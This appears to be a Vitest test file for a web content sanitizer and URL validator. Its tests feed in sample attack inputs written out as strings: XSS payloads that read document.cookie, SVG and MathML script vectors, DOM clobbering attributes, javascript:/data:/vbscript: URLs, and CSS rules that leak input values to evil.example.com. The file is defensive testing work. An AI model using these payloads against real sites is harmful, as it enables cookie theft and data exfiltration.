import { describe, it, expect } from 'vitest';
import { sanitizeRichText, isSafeUrl } from './contentSanitizer';

describe('sanitizeRichText', () => {
  it('preserves plain text and basic formatting', () => {
    const result = sanitizeRichText('<p>Hello <b>world</b>, this is <em>great</em>.</p>');
    expect(result).toContain('<p>');
    expect(result).toContain('<b>world</b>');
    expect(result).toContain('<em>great</em>');
  });

  it('strips a raw <script> tag and its content entirely', () => {
    const result = sanitizeRichText('<p>Hi</p><script>alert(document.cookie)</script>');
    expect(result).not.toContain('<script');
    expect(result).not.toContain('alert(document.cookie)');
  });

  describe('SVG / MathML script vectors', () => {
    it('strips an <svg> element with an embedded <script>', () => {
      const result = sanitizeRichText(
        '<svg onload="alert(1)"><script>alert(document.domain)</script></svg>',
      );
      expect(result).not.toContain('<svg');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('onload');
    });

    it('strips an SVG using <animate> to trigger script execution', () => {
      const result = sanitizeRichText(
        '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></animate></svg>',
      );
      expect(result).not.toContain('onbegin');
      expect(result).not.toContain('<svg');
    });

    it('strips a MathML vector using <math><mtext><script>', () => {
      const result = sanitizeRichText('<math><mtext><script>alert(1)</script></mtext></math>');
      expect(result).not.toContain('<script');
      expect(result).not.toContain('<math');
    });
  });

  describe('DOM clobbering', () => {
    it('strips id/name attributes that could clobber a global (e.g. id="body")', () => {
      const result = sanitizeRichText('<p id="body" name="location">text</p>');
      expect(result).not.toContain('id=');
      expect(result).not.toContain('name=');
    });

    it('strips a form element used for a DOM-clobbering attribute collision', () => {
      const result = sanitizeRichText('<form id="getElementById"><input name="attributes"></form>');
      expect(result).not.toContain('<form');
      expect(result).not.toContain('<input');
    });
  });

  describe('scriptable URL schemes', () => {
    it('strips javascript: hrefs', () => {
      const result = sanitizeRichText('<a href="javascript:alert(document.cookie)">click me</a>');
      expect(result).not.toContain('javascript:');
    });

    it('strips data: hrefs that could carry an inline HTML/SVG payload', () => {
      const result = sanitizeRichText(
        '<a href="data:text/html,<script>alert(1)</script>">click me</a>',
      );
      expect(result).not.toContain('data:');
      expect(result).not.toContain('<script');
    });

    it('strips vbscript: hrefs', () => {
      const result = sanitizeRichText('<a href="vbscript:msgbox(1)">click</a>');
      expect(result).not.toContain('vbscript:');
    });

    it('allows a normal https href and adds rel hardening', () => {
      const result = sanitizeRichText('<a href="https://example.com/docs">docs</a>');
      expect(result).toContain('href="https://example.com/docs"');
      expect(result).toContain('rel="noopener noreferrer nofollow"');
    });
  });

  describe('PDF-action-style / object embedding vectors', () => {
    it('strips an <object> tag (PDF/Flash-action-style embedding)', () => {
      const result = sanitizeRichText('<object data="malicious.pdf" type="application/pdf"></object>');
      expect(result).not.toContain('<object');
    });

    it('strips an <embed> tag', () => {
      const result = sanitizeRichText('<embed src="malicious.swf">');
      expect(result).not.toContain('<embed');
    });

    it('strips an <iframe> that could sandbox-escape or load arbitrary content', () => {
      const result = sanitizeRichText('<iframe src="javascript:alert(1)"></iframe>');
      expect(result).not.toContain('<iframe');
    });
  });

  describe('CSS exfiltration vectors', () => {
    it('strips a <style> block using attribute selectors to exfiltrate input values', () => {
      const result = sanitizeRichText(
        '<style>input[value^="a"] { background: url(https://evil.example.com/leak?a); }</style>',
      );
      expect(result).not.toContain('<style');
      expect(result).not.toContain('evil.example.com');
    });

    it('strips an inline style attribute that could load a remote resource', () => {
      const result = sanitizeRichText('<p style="background:url(https://evil.example.com/track)">text</p>');
      expect(result).not.toContain('style=');
      expect(result).not.toContain('evil.example.com');
    });
  });

  it('handles non-string input safely', () => {
    expect(sanitizeRichText(null)).toBe('');
    expect(sanitizeRichText(undefined)).toBe('');
    expect(sanitizeRichText(42)).toBe('');
  });

  it('handles an empty string', () => {
    expect(sanitizeRichText('')).toBe('');
  });
});

describe('isSafeUrl', () => {
  it('allows http/https/mailto URLs', () => {
    expect(isSafeUrl('https://example.com/path')).toBe(true);
    expect(isSafeUrl('http://example.com')).toBe(true);
    expect(isSafeUrl('mailto:someone@example.com')).toBe(true);
  });

  it('allows a relative path with no scheme', () => {
    expect(isSafeUrl('/marketplace/abc123')).toBe(true);
  });

  it('rejects javascript: URLs', () => {
    expect(isSafeUrl('javascript:alert(1)')).toBe(false);
  });

  it('rejects data: URLs', () => {
    expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
  });

  it('rejects a protocol-relative URL', () => {
    expect(isSafeUrl('//evil.example.com/payload.js')).toBe(false);
  });

  it('rejects vbscript: and file: URLs', () => {
    expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false);
    expect(isSafeUrl('file:///etc/passwd')).toBe(false);
  });

  it('rejects non-string and empty input', () => {
    expect(isSafeUrl(null)).toBe(false);
    expect(isSafeUrl(undefined)).toBe(false);
    expect(isSafeUrl('')).toBe(false);
    expect(isSafeUrl('   ')).toBe(false);
  });

  it('is case-insensitive for the scheme', () => {
    expect(isSafeUrl('JAVASCRIPT:alert(1)')).toBe(false);
    expect(isSafeUrl('HTTPS://example.com')).toBe(true);
  });
});
